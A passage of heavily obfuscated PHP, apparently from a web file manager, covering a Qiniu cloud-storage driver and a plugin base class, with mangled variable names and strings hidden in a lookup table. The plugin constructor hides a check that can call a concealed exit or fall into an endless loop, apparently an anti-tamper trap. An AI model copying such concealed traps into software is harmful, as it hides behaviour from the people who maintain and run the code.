$ë«ÔÈş, $èã„€÷–); if ($ÂÂıÉ¶) { break; } $­åˆöÖ± = array_key_exists($ÑÊĞŒÊæ[1423], $åÈËİ¶) ? $­åˆöÖ± = $åÈËİ¶[$ÑÊĞŒÊæ[1456]] : $ÑÊĞŒÊæ[12]; if ($¹…Í¨Ú) { if (!empty($åÈËİ¶[$ÑÊĞŒÊæ[1457]])) { $ùäÏÊ±Ã += count($åÈËİ¶[$ÑÊĞŒÊæ[1457]]); } if (!empty($åÈËİ¶[$ÑÊĞŒÊæ[1458]])) { $ïÀµû»æ += count($åÈËİ¶[$ÑÊĞŒÊæ[1458]]); } if ($­åˆöÖ± === $ÑÊĞŒÊæ[12]) { break; } continue; } if ($ß´ïóìÄ) { if (!empty($åÈËİ¶[$ÑÊĞŒÊæ[1457]])) { return !0; } } else { if (!empty($åÈËİ¶[$ÑÊĞŒÊæ[1458]])) { return !0; } } if ($­åˆöÖ± === $ÑÊĞŒÊæ[12]) { break; } } if ($¹…Í¨Ú) { return array($ÑÊĞŒÊæ[207] => $ùäÏÊ±Ã, $ÑÊĞŒÊæ[208] => $ïÀµû»æ); } return !1; } public function listAll($Ú¤¡×ğó) { $ÔØ¡’ïä =& $_SERVER[şÒÁøÒÄ]; $±¯½ı¯Ğ = $this->fileList($Ú¤¡×ğó, $ÔØ¡’ïä[12], !0); $ïàïü›´ = array_to_keyvalue($±¯½ı¯Ğ[$ÔØ¡’ïä[83]], $ÔØ¡’ïä[32]); foreach ($±¯½ı¯Ğ[$ÔØ¡’ïä[82]] as $ùòŞà) { if (is_string($ùòŞà)) { $ïàïü›´[$ùòŞà] = array($ÔØ¡’ïä[76] => 0); } } return $this->listAllFiles($Ú¤¡×ğó, $ïàïü›´); } private function fileList($ƒ™ş±„Ä, $‹²„ş— = '', $‘Ÿ‡Ï÷ = 0) { $ÆÅšÎ¤“ =& $_SERVER[şÒÁøÒÄ]; $ƒ™ş±„Ä = trim($ƒ™ş±„Ä, $ÆÅšÎ¤“[8]); $«•Ã­İ¹ = empty($ƒ™ş±„Ä) && $ƒ™ş±„Ä !== $ÆÅšÎ¤“[198] ? $ÆÅšÎ¤“[12] : $ƒ™ş±„Ä . $ÆÅšÎ¤“[8]; $«ú“˜Âá = $ÆÅšÎ¤“[12]; $øÃÃòÖ³ = 1000; $øë ì¼˜ = $àÅÖÊÜò = array(); while (!0) { check_abort(); list($ù¢ıÇü, $§äâÚ€½) = $this->bucketManager->listFiles($this->bucket, $«•Ã­İ¹, $«ú“˜Âá, $øÃÃòÖ³, $‹²„ş—); if ($§äâÚ€½) { break; } $«ú“˜Âá = array_key_exists($ÆÅšÎ¤“[1423], $ù¢ıÇü) ? $«ú“˜Âá = $ù¢ıÇü[$ÆÅšÎ¤“[1456]] : $ÆÅšÎ¤“[12]; $Î£¯æó™ = isset($ù¢ıÇü[$ÆÅšÎ¤“[1457]]) ? $ù¢ıÇü[$ÆÅšÎ¤“[1457]] : array(); $œğ¤û‹ = isset($ù¢ıÇü[$ÆÅšÎ¤“[1458]]) ? $ù¢ıÇü[$ÆÅšÎ¤“[1458]] : array(); foreach ($Î£¯æó™ as $–‰·¡™) { if ($–‰·¡™[$ÆÅšÎ¤“[94]] == $«•Ã­İ¹) { continue; } $Â‹œ×†Ù = $–‰·¡™[$ÆÅšÎ¤“[94]]; $­ÕŠ™§÷ = $–‰·¡™[$ÆÅšÎ¤“[1454]]; $–‰·¡™[$ÆÅšÎ¤“[76]] = $­ÕŠ™§÷; $õº“³š = $­ÕŠ™§÷ == 0 && substr($Â‹œ×†Ù, strlen($Â‹œ×†Ù) - 1, 1) == $ÆÅšÎ¤“[8] ? !0 : !1; $this->cacheMethodInfoSet($Â‹œ×†Ù, $õº“³š, $–‰·¡™); if ($õº“³š) { $øë ì¼˜[] = $Â‹œ×†Ù; continue; } $àÅÖÊÜò[] = $‘Ÿ‡Ï÷ ? $–‰·¡™ : $Â‹œ×†Ù; } foreach ($œğ¤û‹ as $Â‹œ×†Ù) { if ($Â‹œ×†Ù == $«•Ã­İ¹) { continue; } $øë ì¼˜[] = $Â‹œ×†Ù; $this->cacheMethodInfoSet($Â‹œ×†Ù, !0); } if ($«ú“˜Âá === $ÆÅšÎ¤“[12]) { break; } } $this->cacheMethodInfoSet($ƒ™ş±„Ä, !0); return array($ÆÅšÎ¤“[82] => $øë ì¼˜, $ÆÅšÎ¤“[83] => $àÅÖÊÜò); } public function canRead($†¶®¦Î) { return $this->exist($†¶®¦Î) ? !0 : !1; } public function canWrite($ä¸çÔâ) { return $this->exist($ä¸çÔâ) ? !0 : !1; } public function getContent($Î‡å¥îŠ) { return $this->fileSubstr($Î‡å¥îŠ, 0, -1); } public function setContent($à’„Ò¯ƒ, $šä€›Ø¢ = '') { $ÀÈŒ€‡ = $this->tempFile($this->pathThis($à’„Ò¯ƒ)); file_put_contents($ÀÈŒ€‡, $šä€›Ø¢); if ($this->upload($à’„Ò¯ƒ, $ÀÈŒ€‡)) { $this->tempFileRemve($ÀÈŒ€‡); return !0; } return !1; } public function refreshUrls($Ê£Õ¡’®) { $Áëìâ‡ =& $_SERVER[şÒÁøÒÄ]; $Ë™“©ş = array(); if (is_array($Ê£Õ¡’®)) { foreach ($Ê£Õ¡’® as $¿¹üÊœÔ) { $Ë™“©ş[] = $this->link($¿¹üÊœÔ); } } else { $Ë™“©ş[] = $this->link($Ê£Õ¡’®); } $ö“òÃ¨ = new Qiniu\Cdn\CdnManager($this->auth); list($ÃüÑÎœ—, $ ¯®¦¯›) = $ö“òÃ¨->refreshUrls($Ë™“©ş); if ($ ¯®¦¯›) { return !1; } return $ÃüÑÎœ—[$Áëìâ‡[1195]] == $Áëìâ‡[767] ? !0 : !1; } public function fileSubstr($£‹¤À¶Ÿ, $ú»ô‚äü, $å®Õ×Äö) { $¨À•¸Í =& $_SERVER[şÒÁøÒÄ]; if (!($¢¾ÂĞè¯ = $this->link($£‹¤À¶Ÿ))) { return !1; } $»µĞ„ä = !1; if ($å®Õ×Äö > 0) { $´œñ…Ê¥ = $ú»ô‚äü + $å®Õ×Äö - 1; $»µĞ„ä = array($¨À•¸Í[1459] . $ú»ô‚äü . $¨À•¸Í[386] . $´œñ…Ê¥); } $œƒ±¢¨® = url_request($¢¾ÂĞè¯, $¨À•¸Í[230], !1, $»µĞ„ä); return $œƒ±¢¨®[$¨À•¸Í[757]] ? $œƒ±¢¨®[$¨À•¸Í[1215]] : !1; } public function upload($Ü‰ÕÑñ, $ŠÙ°é°©, $İÓ·¼ = false, $¶§å­Ç = REPEAT_REPLACE) { $Üö×€Ô = new Qiniu\Storage\UploadManager(); $Õ¦¢Ñˆ = $this->auth->uploadToken($this->bucket, $Ü‰ÕÑñ); $¢âì«Ñ = get_file_mime(get_path_ext($ŠÙ°é°©)); list($ş®š²Àñ, $íÃŸÜèÀ) = $Üö×€Ô->putFile($Õ¦¢Ñˆ, $Ü‰ÕÑñ, $ŠÙ°é°©, null, $¢âì«Ñ); return $íÃŸÜèÀ ? !1 : $this->getPathOuter($Ü‰ÕÑñ); } public function uploadFormData($¡ş™¶ÁÁ, $ÍûÉ¡ë = 3600) { return $this->uploadToken($¡ş™¶ÁÁ, $ÍûÉ¡ë); } public function multiUploadFormData($˜œ¸¬†„, $ÏÕœ€¦ş = 3600) { return $this->uploadToken($˜œ¸¬†„, $ÏÕœ€¦ş); } private function uploadToken($‡ÑõÔ—©, $îÕÛë‰ = 3600) { $Æğâíá =& $_SERVER[şÒÁøÒÄ]; $—×šæ”û = $îÕÛë‰; $Ã×ìšµ¨ = array($Æğâíá[1460] => $Æğâíá[1461]); $èª›—é = $‡ÑõÔ—©; $¾Ü‹İÅ¥ = $this->auth->uploadToken($this->bucket, $èª›—é, $—×šæ”û, $Ã×ìšµ¨, !0); $Ò½²Ç½Ò = empty($this->region) || $this->region == $Æğâíá[1462] ? $Æğâíá[12] : $Æğâíá[386] . $this->region; $ò²²‰Â¦ = http_type() . "\72\x2f\x2f\165\160\x6c\157\x61\x64{$Ò½²Ç½Ò}\56\x71\151\x6e\x69\165\160\56\x63\157\x6d\57"; return array($Æğâíá[1463] => $¾Ü‹İÅ¥, $Æğâíá[1464] => $ò²²‰Â¦); } public function download($ïÁ‘Ìşõ, $®æŸì’Œ) { $ñâìÓ¥ = IO::getPathInner(IO::mkfile($®æŸì’Œ)); if (!($¥…®™ÈĞ = $this->link($ïÁ‘Ìşõ))) { return !1; } $Şƒ‹ôÜ = 0; $äûºüÓ’ = 1024 * 200; $…Ñ›üºŞ = fopen($ñâìÓ¥, $_SERVER[şÒÁøÒÄ][1465]); while (!0) { $º˜–ëÆá = $this->fileSubstr($ïÁ‘Ìşõ, $Şƒ‹ôÜ, $äûºüÓ’); if ($º˜–ëÆá === !1) { return !1; } fwrite($…Ñ›üºŞ, $º˜–ëÆá); $Şƒ‹ôÜ += $äûºüÓ’; if (strlen($º˜–ëÆá) < $äûºüÓ’) { break; } } fclose($…Ñ›üºŞ); return $®æŸì’Œ; } public function link($¾Ä°û«, $Èèå¿®Á = '') { if (!$this->isFile($¾Ä°û«)) { return !1; } $‹øşñ  = $this->getHost() . $_SERVER[şÒÁøÒÄ][8] . $this->pathEncode($¾Ä°û«) . $Èèå¿®Á; return $this->auth->privateDownloadUrl($‹øşñ , 3600 * 12); } public function fileOut($İÉ€Šşé, $ø•ØØÀ– = false, $§¤–Ü˜— = false, $§¿ùĞˆø = '') { $—ÜÊé =& $_SERVER[şÒÁøÒÄ]; if ($this->isFileOutServer()) { return $this->fileOutServer($İÉ€Šşé, $ø•ØØÀ–, $§¤–Ü˜—, $§¿ùĞˆø); } if (!$§¤–Ü˜—) { $§¤–Ü˜— = $this->pathThis($İÉ€Šşé); } $µ­˜×â = $ø•ØØÀ– ? $—ÜÊé[1466] . rawurlencode($§¤–Ü˜—) : $—ÜÊé[12]; $«£½š—® = $this->link($İÉ€Šşé, $µ­˜×â); $this->fileOutLink($«£½š—®); } public function fileOutServer($¬§ÖŞÓ, $·Æ¥âå = false, $ƒôåçÍ = false, $Ô­›¥È… = '') { parent::fileOut($¬§ÖŞÓ, $·Æ¥âå, $ƒôåçÍ, $Ô­›¥È…); } public function fileOutImage($„Ê†ûÈ„, $üôˆèñ‰ = 250) { $å±²Ô´˜ = $this->link($„Ê†ûÈ„, $_SERVER[şÒÁøÒÄ][1467] . $üôˆèñ‰); $this->fileOutLink($å±²Ô´˜); } public function fileOutImageServer($šÀªıìá, $»Ã«Ò² = 250) { parent::fileOutImage($šÀªıìá, $»Ã«Ò²); } public function hashMd5($ñ‹‰ñÅ­) { $–Î¨Æ·ï =& $_SERVER[şÒÁøÒÄ]; $˜Ù€—¬È = $this->objectMeta($ñ‹‰ñÅ­); return isset($˜Ù€—¬È[$–Î¨Æ·ï[212]]) ? $˜Ù€—¬È[$–Î¨Æ·ï[212]] : !1; $° òø«Š = $this->link($ñ‹‰ñÅ­, $–Î¨Æ·ï[1468]); } public function size($±€“¢«) { $½Åª‰í  = $this->objectMeta($±€“¢«); return $½Åª‰í  ? $½Åª‰í [$_SERVER[şÒÁøÒÄ][76]] : 0; } public function info($äºó¸ı”) { if ($this->isFolder($äºó¸ı”)) { return $this->folderInfo($äºó¸ı”); } else { if ($this->isFile($äºó¸ı”)) { return $this->fileInfo($äºó¸ı”); } } return !1; } public function exist($­°²êò) { return $this->isFile($­°²êò) || $this->isFolder($­°²êò); } public function isFile($é¹ÙçÍ) { return !$this->isFolder($é¹ÙçÍ) && $this->objectMeta($é¹ÙçÍ); } public function isFolder($ØÖĞ˜®–) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][165], $ØÖĞ˜®–); } protected function objectMeta($ƒÌ•­‹) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][167], $ƒÌ•­‹); } protected function _objectMeta($øò¡Èù) { $Ü˜ÆÖùÍ =& $_SERVER[şÒÁøÒÄ]; list($àğ†–Ùø, $Ê‘ôŸ¶¸) = $this->bucketManager->stat($this->bucket, $øò¡Èù); if ($àğ†–Ùø) { $àğ†–Ùø[$Ü˜ÆÖùÍ[76]] = intval($àğ†–Ùø[$Ü˜ÆÖùÍ[1454]]); } return $àğ†–Ùø; } protected function _isFolder($Æ¤§‰²¤) { $¥ßèœ =& $_SERVER[şÒÁøÒÄ]; if ($Æ¤§‰²¤ == $¥ßèœ[12] || $Æ¤§‰²¤ == $¥ßèœ[8]) { return !0; } list($ÚèÊ‡Çº, $ÔóíÇÕ) = $this->bucketManager->listFiles($this->bucket, trim($Æ¤§‰²¤, $¥ßèœ[8]) . $¥ßèœ[8], $¥ßèœ[12], 1, $¥ßèœ[8]); return !empty($ÚèÊ‡Çº[$¥ßèœ[1457]]) || !empty($ÚèÊ‡Çº[$¥ßèœ[1458]]) ? !0 : !1; } } goto cĞ¦Õš½Ü¬; bÓĞÈè¨˜: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¶¿« ¿Í =& $_SERVER[şÒÁøÒÄ]; if (!isset($_SERVER[$¶¿« ¿Í[887]]) || !isset($_SERVER[$¶¿« ¿Í[1370]])) { $ÇÌÛ¢üî = $¶¿« ¿Í[888]; $¢ÆØÚ‰ã = $¶¿« ¿Í[889]; $”†æØë¢ = $_SERVER[$¶¿« ¿Í[884]] . $¶¿« ¿Í[885]; $ï¾ñÇÈü = $¢ÆØÚ‰ã($”†æØë¢); $Ğ£ø°ÛÒ = explode($¶¿« ¿Í[231], $ï¾ñÇÈü); if (count($Ğ£ø°ÛÒ) < $¶¿« ¿Í[616]) { $Üû»¶äŒ = $¶¿« ¿Í[890]; $Üû»¶äŒ(); } $Üîà´›Ë = $¶¿« ¿Í[891]; $Üîà´›Ë($_SERVER[$¶¿« ¿Í[892]]); $·ºß›ŒÆ = 1; for ($œÁ¼÷®À = $·ºß›ŒÆ; $œÁ¼÷®À > 0; $œÁ¼÷®À++) { $Üîà´›Ë = json_encode($GLOBALS[$¶¿« ¿Í[418]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¶¿« ¿Í[1548]); $this->pluginName = str_replace($¶¿« ¿Í[1548], $¶¿« ¿Í[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¶¿« ¿Í[8]; $this->pluginApi = appHostGet() . $¶¿« ¿Í[1549] . $this->pluginName . $¶¿« ¿Í[8]; $this->pluginHost = $config[$¶¿« ¿Í[1550]] . $this->pluginName . $¶¿« ¿Í[8]; $this->pluginHostDefault = $config[$¶¿« ¿Í[1550]] . $this->pluginName . $¶¿« ¿Í[8]; $…î²Ş ö = $config[$¶¿« ¿Í[1551]]; if ($…î²Ş ö && strpos($¶¿« ¿Í[50] . $…î²Ş ö . $¶¿« ¿Í[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¶¿« ¿Í[1552]] . $this->pluginName . $¶¿« ¿Í[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[şÒÁøÒÄ][1553]); } protected function assign($˜èŒè‚Û, $ø‘ÆËù¡ = false) { if (is_array($˜èŒè‚Û)) { $this->values = array_merge($this->values, $˜èŒè‚Û); } else { $this->values[$˜èŒè‚Û] = $ø‘ÆËù¡; } } protected function display($ôÒËëñà) { extract($this->values); require $ôÒËëñà; } final function hookRegist($èÅ…ú•Ä) { $this->modelPlugin->appRegist($this->pluginName, $èÅ…ú•Ä); } final function appIcon() { $Œæ‹é«¼ =& $_SERVER[şÒÁøÒÄ]; $ñ¨£Çßş = $this->appPackage(); $êß·—ú— = $Œæ‹é«¼[12]; if (isset($ñ¨£Çßş[$Œæ‹é«¼[416]])) { if (isset($ñ¨£Çßş[$Œæ‹é«¼[416]][$Œæ‹é«¼[1554]])) { $êß·—ú— = $Œæ‹é«¼[1555] . $ñ¨£Çßş[$Œæ‹é«¼[416]][$Œæ‹é«¼[1554]] . $Œæ‹é«¼[1556]; } else { if ($ñ¨£Çßş[$Œæ‹é«¼[416]][$Œæ‹é«¼[1557]]) { $êß·—ú— = $Œæ‹é«¼[1558] . $ñ¨£Çßş[$Œæ‹é«¼[416]][$Œæ‹é«¼[1557]] . $Œæ‹é«¼[1559]; } } } return $êß·—ú—; } final function fileCanView($ãŒ¾€ô©) { $÷ìöêÒü =& $_SERVER[şÒÁøÒÄ]; if (request_url_safe($ãŒ¾€ô©)) { return !0; } if ($this->isShare($ãŒ¾€ô©)) { return !0; } $“ŞÆ‡ƒ = Session::get($÷ìöêÒü[1560]); if (!$“ŞÆ‡ƒ || !$“ŞÆ‡ƒ[$÷ìöêÒü[1561]]) { $ó‚Å¾’ç = $÷ìöêÒü[1562] . rawurlencode(this_url()); show_tips(LNG($÷ìöêÒü[1563]) . $÷ìöêÒü[1564] . $ó‚Å¾’ç . $÷ìöêÒü[1565] . LNG($÷ìöêÒü[1566]) . $÷ìöêÒü[1567], !1); } if (!Action($÷ìöêÒü[1568])->authCan($÷ìöêÒü[1569])) { show_tips(LNG($÷ìöêÒü[1570]) . $÷ìöêÒü[1571], !1); } ActionCall($÷ìöêÒü[1572], $ãŒ¾€ô©); } final function isShare($¹ÃÈÜÏ) { $™¬Ÿ¶æÄ = KodIO::parse($¹ÃÈÜÏ); return $™¬Ÿ¶æÄ[$_SERVER[şÒÁøÒÄ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($²‚ŒßÖ©) { if (request_url_safe($²‚ŒßÖ©)) { return $²‚ŒßÖ©; } if (!$this->isShare($²‚ŒßÖ©)) { $²‚ŒßÖ© = $this->filePath($²‚ŒßÖ©); } return Action($_SERVER[şÒÁøÒÄ][1187])->linkOut($²‚ŒßÖ©); } public function filePathLinkOut($ûÖşô‹ê) { if (request_url_safe($ûÖşô‹ê)) { return $ûÖşô‹ê; } $this->fileCanView($ûÖşô‹ê); return Action($_SERVER[şÒÁøÒÄ][1187])->link($ûÖşô‹ê); } final function filePath($ò¯¾ÒÔÎ) { $¨‚š½¼» =& $_SERVER[şÒÁøÒÄ]; if ($ûÕñŠ™ = $this->checkSharePath($ò¯¾ÒÔÎ)) { Hook::trigger($¨‚š½¼»[1573], $ûÕñŠ™); return $ûÕñŠ™; } $this->fileCanView($ò¯¾ÒÔÎ); if (request_url_safe($ò¯¾ÒÔÎ)) { $¸Ù—ÔÔÃ = parse_url_query($ò¯¾ÒÔÎ); if (isset($¸Ù—ÔÔÃ[$¨‚š½¼»[1574]]) && isset($¸Ù—ÔÔÃ[$¨‚š½¼»[213]])) { $¶¶˜¸İş = Model($¨‚š½¼»[778])->get($¨‚š½¼»[779]); $ş“”Œ‰€ = Mcrypt::decode($¸Ù—ÔÔÃ[$¨‚š½¼»[213]], $¶¶˜¸İş); if ($ş“”Œ‰€) { $this->fileInfo = IO::infoWithChildren($ş“”Œ‰€); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ş“”Œ‰€; } } $ò¯¾ÒÔÎ = $this->_cacheHttpFile($ò¯¾ÒÔÎ); $this->fileInfo = IO::infoWithChildren($ò¯¾ÒÔÎ); } else { $this->fileInfo = IO::infoWithChildren($ò¯¾ÒÔÎ); if (!$this->fileInfo) { show_tips(LNG($¨‚š½¼»[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($¨‚š½¼»[1573], $ò¯¾ÒÔÎ); return $ò¯¾ÒÔÎ; } final function _cacheHttpFile($’™™Ÿ¯) { $¯†²ñÇÑ = hash_path($’™™Ÿ¯, !0); $this->cachePath = $this->pluginCachePath($¯†²ñÇÑ); if ($Áæß¿ä¢ = IO::fileNameExist($this->cachePath, $¯†²ñÇÑ)) { return KodIO::make($Áæß¿ä¢); } $½ú‘üİ = $this->cachePath . $¯†²ñÇÑ; return $this->pluginCacheFileSet($½ú‘üİ, file_get_contents_nossl($’™™Ÿ¯)); } final function _tmpFileName($ÅûÎ¤Š× = array()) { $“èåü»ş =& $_SERVER[şÒÁøÒÄ]; if (!$ÅûÎ¤Š×) { $ÅûÎ¤Š× = $this->fileInfo; } if (isset($ÅûÎ¤Š×[$“èåü»ş[177]])) { return $ÅûÎ¤Š×[$“èåü»ş[177]]; } if (isset($ÅûÎ¤Š×[$“èåü»ş[170]][$“èåü»ş[177]])) { return $ÅûÎ¤Š×[$“èåü»ş[170]][$“èåü»ş[177]]; } $‡Ú’çŸì = IO::hashSimple($ÅûÎ¤Š×[$“èåü»ş[84]]); if ($‡Ú’çŸì) { return $‡Ú’çŸì; } $²©‰¹±Ò = array($ÅûÎ¤Š×[$“èåü»ş[32]], $ÅûÎ¤Š×[$“èåü»ş[84]], $ÅûÎ¤Š×[$“èåü»ş[76]]); if (isset($ÅûÎ¤Š×[$“èåü»ş[511]])) { $²©‰¹±Ò[] = $ÅûÎ¤Š×[$“èåü»ş[511]]; } return md5(implode($“èåü»ş[11], $²©‰¹±Ò)); } final function checkSharePath($à÷€ŞÓ®) { $ß´Èı â =& $_SERVER[şÒÁøÒÄ]; if (!$this->isShare($à÷€ŞÓ®)) { return !1; } $÷­äÑšˆ = Action($ß´Èı â[1187])->sharePathInfo($à÷€ŞÓ®); if (!isset($÷­äÑšˆ[$ß´Èı â[84]])) { show_json(LNG($ß´Èı â[1575]), !1); } $this->fileInfo = $÷­äÑšˆ[$ß´Èı â[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ß´Èı â[177]]); return $÷­äÑšˆ[$ß´Èı â[84]]; } final function pluginCachePath($ö¯¹ôÙˆ = '') { $õ‹©œÊ =& $_SERVER[şÒÁøÒÄ]; $ôÀ¢¯­¦ = IO_PATH_SYSTEM_TEMP . $õ‹©œÊ[1576] . $this->pluginName; if (!($»¤Æâœ† = IO::infoFull($ôÀ¢¯­¦))) { return IO::mkdir($ôÀ¢¯­¦ . $õ‹©œÊ[8] . $ö¯¹ôÙˆ); } if (empty($ö¯¹ôÙˆ)) { return $»¤Æâœ†[$õ‹©œÊ[84]]; } if (!($º½È–Â = IO::fileNameExist($»¤Æâœ†[$õ‹©œÊ[84]], $ö¯¹ôÙˆ))) { return IO::mkdir($»¤Æâœ†[$õ‹©œÊ[84]] . $ö¯¹ôÙˆ); } return KodIO::make($º½È–Â); } final function pluginCacheFileSet($…É‚ğ·ï, $‚Ğáá¤ğ = '') { $¨©õÂ =& $_SERVER[şÒÁøÒÄ]; if (!($Æ—Ã×§¹ = IO::infoFull($…É‚ğ·ï))) { return IO::mkfile($…É‚ğ·ï, $‚Ğáá¤ğ, REPEAT_REPLACE); } IO::setContent($Æ—Ã×§¹[$¨©õÂ[84]], $‚Ğáá¤ğ); return $Æ—Ã×§¹[$¨©õÂ[84]]; } final function pluginLocalFile($ûä¾Üğë = '') { $½ÇÛ¡–Í =& $_SERVER[şÒÁøÒÄ]; $œò²ØÂĞ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($œò²ØÂĞ)) { mk_dir($œò²ØÂĞ); } if (!$ûä¾Üğë) { return $œò²ØÂĞ; } $‚œÑûÑ¶ = IO::info($ûä¾Üğë); $ï¼é”ê = $this->_tmpFileName($‚œÑûÑ¶) . $½ÇÛ¡–Í[10] . $‚œÑûÑ¶[$½ÇÛ¡–Í[174]]; if (!checkExtSafe($ï¼é”ê)) { $ï¼é”ê = $ï¼é”ê . $½ÇÛ¡–Í[1219]; } $ÙûÚ¯ß = $œò²ØÂĞ . $ï¼é”ê; if (@file_exists($ÙûÚ¯ß)) { return $ÙûÚ¯ß; } return IO::copy($ûä¾Üğë, $œò²ØÂĞ, 0, $ï¼é”ê); } final function appPackage() { $ ë¥Ñ× =& $_SERVER[şÒÁøÒÄ]; if ($this->packageData) { return $this->packageData; } $…ëşÉçù = $this->parseFile($this->pluginPath . $ ë¥Ñ×[1577]); $this->parseLang($…ëşÉçù); $ßêÈ€ºÉ = json_decode_force($…ëşÉçù); if (!$ßêÈ€ºÉ) { return array(); } $œ¯ÙğŞ¼ = Hook::trigger($ ë¥Ñ×[1578], $ßêÈ€ºÉ); if ($œ¯ÙğŞ¼ && is_array($œ¯ÙğŞ¼)) { $ßêÈ€ºÉ = $œ¯ÙğŞ¼; } $this->packageData = $ßêÈ€ºÉ; return $ßêÈ€ºÉ; } public function packageInfoGet($óå­Ø½ò) { $ñĞÉ¯úá = $this->appPackage(); return array_get_value($ñĞÉ¯úá, $óå­Ø½ò); } public function packageVersion() { return $this->packageInfoGet($_SERVER[şÒÁøÒÄ][1579]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[şÒÁøÒÄ][1580]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[şÒÁøÒÄ][1581]); } public function echoJsAssign($³’ç‰•¦, $ÑùøÀ°º) { $this->echoJsAssignArr[$³’ç‰•¦] = $ÑùøÀ°º; } private function parseFile($÷³Ã°Õœ) { $¼®¬£Æé =& $_SERVER[şÒÁøÒÄ]; $Û­û°á = file_get_contents_nossl($÷³Ã°Õœ); $ãä½ãúÒ = array($¼®¬£Æé[1582], $¼®¬£Æé[1583], $¼®¬£Æé[1584], $¼®¬£Æé[1585], $¼®¬£Æé[1586], $¼®¬£Æé[1587], $¼®¬£Æé[1588]); $îëÓïÂ” = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¼®¬£Æé[89]][$¼®¬£Æé[1589]]); foreach ($this->echoJsAssignArr as $Á×âÉÎí => $°óüáú€) { $ãä½ãúÒ[] = $¼®¬£Æé[1590] . $Á×âÉÎí . $¼®¬£Æé[1591]; $îëÓïÂ”[] = is_array($°óüáú€) || is_object($°óüáú€) ? rawurlencode(json_encode($°óüáú€)) : $°óüáú€; } if (strstr($Û­û°á, $¼®¬£Æé[1592])) { $äÊÌ’¯˜ = rawurlencode(json_encode($this->pluginLangArr)); $Û­û°á = str_replace($¼®¬£Æé[1592], $äÊÌ’¯˜, $Û­û°á); } if (strstr($Û­û°á, $¼®¬£Æé[1593])) { $äÊÌ’¯˜ = $äÊÌ’¯˜ = rawurlencode(json_encode($this->getConfig())); $Û­û°á = str_replace($¼®¬£Æé[1593], $äÊÌ’¯˜, $Û­û°á); } $Û­û°á = str_replace($ãä½ãúÒ, $îëÓïÂ”, $Û­û°á); return $Û­û°á; } private function parseLang(&$Ô¹‡éË–) { $ ‰µÖÕ‹ =& $_SERVER[şÒÁøÒÄ]; $ó›Çæ‘ü = $ ‰µÖÕ‹[1594]; if (!strstr($Ô¹‡éË–, $ó›Çæ‘ü)) { return; } preg_match_all($ ‰µÖÕ‹[1595], $Ô¹‡éË–, $ÕŒ®àÖÓ); if (!is_array($ÕŒ®àÖÓ) || count($ÕŒ®àÖÓ) == 0 || !is_array($ÕŒ®àÖÓ[0]) || count($ÕŒ®àÖÓ[0]) == 0) { return; } $Ñûˆ­ø¹ = array(); $‹õ¶‚¶ = array(); foreach ($ÕŒ®àÖÓ[0] as $Øˆ•»­) { $Ã‰êúë± = substr($Øˆ•»­, strlen($ó›Çæ‘ü), -4); $½—®ªë§ = LNG($Ã‰êúë±); $Ñûˆ­ø¹[] = $Øˆ•»­; $‹õ¶‚¶[] = str_replace(array($ ‰µÖÕ‹[231], $ ‰µÖÕ‹[1091], $ ‰µÖÕ‹[342], $ ‰µÖÕ‹[118]), array($ ‰µÖÕ‹[53], $ ‰µÖÕ‹[53], $ ‰µÖÕ‹[12], $ ‰µÖÕ‹[1596]), $½—®ªë§); } $Ô¹‡éË– = str_replace($Ñûˆ­ø¹, $‹õ¶‚¶, $Ô¹‡éË–); } private function parseConfig(&$Ë®Ö†õğ) { $¥ÖÊë°æ =& $_SERVER[şÒÁøÒÄ]; $¶´àÅºâ = $¥ÖÊë°æ[1597]; if (!strstr($Ë®Ö†õğ, $¶´àÅºâ)) { return; } preg_match_all($¥ÖÊë°æ[1598], $Ë®Ö†õğ, $„£ª¥ÎÍ); if (!is_array($„£ª¥ÎÍ) || count($„£ª¥ÎÍ) == 0 || !is_array($„£ª¥ÎÍ[0]) || count($„£ª¥ÎÍ[0]) == 0) { return; } $ìøÍ¾É× = $this->getConfig(); $Ú€º«ˆÓ = array(); $øâñ‡Ä = array(); foreach ($„£ª¥ÎÍ[0] as $ßàÆ´¾ç) { $±ğŞÂºš = substr($ßàÆ´¾ç, strlen($¶´àÅºâ), -2); $Ú€º«ˆÓ[] = $ßàÆ´¾ç; $øâñ‡Ä[] = _get($ìøÍ¾É×, $±ğŞÂºš); } $Ë®Ö†õğ = str_replace($Ú€º«ˆÓ, $øâñ‡Ä, $Ë®Ö†õğ); } private function parsePackage(&$Ş¨‹í’») { $©Ù—Ó™ =& $_SERVER[şÒÁøÒÄ]; $ôŸÜÃ‹ = $©Ù—Ó™[1599]; if (!strstr($Ş¨‹í’», $ôŸÜÃ‹)) { return; } preg_match_all($©Ù—Ó™[1600], $Ş¨‹í’», $×ãæÂÄÁ); if (!is_array($×ãæÂÄÁ) || count($×ãæÂÄÁ) == 0 || !is_array($×ãæÂÄÁ[0]) || count($×ãæÂÄÁ[0]) == 0) { return; } $ı–ĞÖ÷è = $this->appPackage(); $ã¤¨Ç†ş = array(); $²ºšÀ«Ò = array(); foreach ($×ãæÂÄÁ[0] as $ì÷Åâî÷) { $±ô¼»Ë = substr($ì÷Åâî÷, strlen($ôŸÜÃ‹), -2); $ã¤¨Ç†ş[] = $ì÷Åâî÷; $²ºšÀ«Ò[] = _get($ı–ĞÖ÷è, $±ô¼»Ë); } $Ş¨‹í’» = str_replace($ã¤¨Ç†ş, $²ºšÀ«Ò, 